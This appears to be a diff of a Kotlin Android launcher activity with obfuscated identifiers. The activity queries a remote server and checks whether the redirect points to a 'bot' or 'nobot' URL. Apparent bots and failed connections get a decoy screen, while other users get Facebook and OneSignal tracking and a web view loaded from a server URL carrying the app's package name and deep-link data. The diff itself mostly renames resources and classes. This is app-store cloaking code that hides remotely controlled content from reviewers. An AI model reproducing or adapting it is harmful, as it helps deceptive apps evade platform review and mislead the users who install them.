@@ -1,35 +1,30 @@
 package com.hythluynlhkjbkflvf.rpogportbpgoglkbm.fnrjfnrjnflkr.fvnklfvlmrtklbvtr.gnktjnvktnjbrkjbv.vbnkgrtnglr
 
 import android.content.Context
-import android.content.Intent
-import android.os.Bundle
 import android.util.Log
-import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import com.android.volley.Request
-import com.android.volley.toolbox.StringRequest
 import com.android.volley.toolbox.Volley
-import com.facebook.FacebookSdk
-import com.facebook.applinks.AppLinkData
+import com.android.volley.Request
+import android.os.Bundle
 import com.onesignal.OneSignal
+import com.android.volley.toolbox.StringRequest
+import com.facebook.FacebookSdk
+import android.content.Intent
+import com.hythluynlhkjbkflvf.rpogportbpgoglkbm.fnrjfnrjnflkr.fvnklfvlmrtklbvtr.kfrlvmgtlkrmgbltrg.VrvtfrkvnbkrtgbtyghnBYTHbvnftkrjbg
+import com.facebook.applinks.AppLinkData
 import com.hythluynlhkjbkflvf.rpogportbpgoglkbm.R
-import com.hythluynlhkjbkflvf.rpogportbpgoglkbm.gbvlktngbkrtgnlkglb.vftglktnlvkfrjnvkgrenvkjnerlk.GBtbmgtmblBGYtbjktgb
 import com.hythluynlhkjbkflvf.rpogportbpgoglkbm.fnrjfnrjnflkr.fvnklfvlmrtklbvtr.vktfltmrblktr.cvnlkf.FvfjgvngrfvGhmyknhyju
-
 
 class HfnnrvhjrfjFfvjrvjkgrfv : AppCompatActivity() {
     private val spName: String = "CHECK"
     private val spStatus: String = "PASS"
     private val NOBOT_URL = "https://nobot"
     private val BOT_URL = "https://bot"
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.vfimflvlkgfblvmgfrlkbmvfrt)
-
-        sendGet1(getString(R.string.grtvmnbrtmnbkjt_vgtrnbjtkgybmnkty_bgtnbjtg))
+        setContentView(R.layout.tgvnkrngkrtlg_trfvgnrkjgnkrt)
+        sendGet1(getString(R.string.fvndjvnkjfdv_vfrvkjnfrgjvkrgtvkbgrt_ftvgjntrnvjbgf))
     }
-
     private fun sendGet(url: String, deepString: String = "") {
         Log.e("Sending url", url)
         val queue = Volley.newRequestQueue(this)
@@ -41,7 +36,6 @@ class HfnnrvhjrfjFfvjrvjkgrfv : AppCompatActivity() {
             { error ->
                 when (error?.networkResponse?.headers?.get("location")) {
                     null -> {
-                        Toast.makeText(this, "Connection Error!", Toast.LENGTH_LONG).show()
                         startCap()
                     }
                     BOT_URL -> startCap()
@@ -52,10 +46,8 @@ class HfnnrvhjrfjFfvjrvjkgrfv : AppCompatActivity() {
                     }
                 }
             })
-
         queue.add(stringRequest)
     }
-
     private fun sendGet1(url: String) {
         Log.e("Sending url", url)
         val queue = Volley.newRequestQueue(this)
@@ -69,24 +61,21 @@ class HfnnrvhjrfjFfvjrvjkgrfv : AppCompatActivity() {
                         Log.e("already", "main")
                         startMain()
                     } else {
-                        //onesignal init
                         OneSignal.startInit(this)
                             .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                             .unsubscribeWhenNotificationsAreDisabled(true)
                             .init()
-
-                        //fb init
                         FacebookSdk.setAutoInitEnabled(true)
                         FacebookSdk.fullyInitialize()
                         AppLinkData.fetchDeferredAppLinkData(
                             this
                         ) {
                             if (it == null) {
-                                sendGet(getString(R.string.vnrgjnkjrgb_bbgtrjkbvnjknrt))
+                                sendGet(getString(R.string.fderjvjkfrvkjfvjkf_gbngkfjnbkjgfnbkjgktrfbg))
                             } else {
                                 val deepData = it.targetUri
                                 sendGet(
-                                    getString(R.string.vnrgjnkjrgb_bbgtrjkbvnjknrt),
+                                    getString(R.string.fderjvjkfrvkjfvjkf_gbngkfjnbkjgfnbkjgktrfbg),
                                     deepData?.query.toString()
                                 )
                             }
@@ -96,48 +85,39 @@ class HfnnrvhjrfjFfvjrvjkgrfv : AppCompatActivity() {
                 Log.i("Response", response.toString())
             },
             {
-                Toast.makeText(this, "Connection Error!", Toast.LENGTH_LONG).show()
                 startCap()
             })
-
         queue.add(stringRequest)
     }
-
     private fun getBundle(): String {
         return this.packageName
     }
-
     private fun formUrl(deepString: String): String {
-        var url = getString(R.string.vjnfrkjvtnkgr_tvbtgrnhjvbtkgjrbv_rtbvrkjnb)
+        var url = getString(R.string.vnkfrtjvgftkg_bgtbngtkjnbjkgt_btrgbngtkrjbnkjrt)
         url += "?source=${getBundle()}"
-
         if (deepString != "") {
             url += "&$deepString"
         }
         Log.e("Url", url)
         return url
     }
-
     private fun startMain(deepString: String = "") {
         val intent = Intent(this, FvfjgvngrfvGhmyknhyju::class.java)
         intent.putExtra("url", formUrl(deepString))
         startActivity(intent)
         finish()
     }
-
     private fun startCap() {
-        val intent = Intent(this, GBtbmgtmblBGYtbjktgb::class.java)
+        val intent = Intent(this, VrvtfrkvnbkrtgbtyghnBYTHbvnftkrjbg::class.java)
         startActivity(intent)
         finish()
     }
-
     private fun setCheckingState(status: Boolean) {
         val sp = getSharedPreferences(spName, Context.MODE_PRIVATE)
         val editor = sp.edit()
         editor.putBoolean(spStatus, status)
         editor.apply()
     }
-
     private fun getCheckingState(): Boolean {
         val sp = getSharedPreferences(spName, Context.MODE_PRIVATE)
         return sp.getBoolean(spStatus, false)
